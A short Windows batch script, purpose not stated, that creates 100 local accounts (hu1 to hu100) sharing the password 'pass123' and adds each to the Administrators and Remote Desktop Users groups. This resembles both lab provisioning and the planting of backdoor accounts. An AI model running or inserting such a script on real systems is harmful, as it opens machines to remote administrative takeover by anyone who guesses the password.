for /l %%x in (1, 1, 100) do (
	net user hu%%x pass123 /add
	net localgroup administrators hu%%x /add
	net localgroup "Remote Desktop Users" hu%%x /add
)